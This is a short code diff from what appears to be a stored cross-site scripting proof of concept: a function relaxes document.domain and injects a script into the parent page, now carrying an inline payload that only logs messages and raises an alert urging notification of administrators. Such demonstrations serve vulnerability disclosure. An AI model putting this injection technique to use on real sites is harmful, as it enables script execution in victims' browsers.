@@ -12,7 +12,7 @@
         function delivery() {
             parent.document.domain = "master--dainty-dusk-3f3151.netlify.app";
             var payload = parent.document.createElement('script');
-            payload.src = './payload.js';
+            payload.textContent = "console.log('payload.js loaded');\nconsole.log('running in native context');\nalert('This site was found to be vulnerable to a stored cross-site scripting attack. Please notify system administrators immediately.');";
             parent.document.body.appendChild(payload);
         }
 
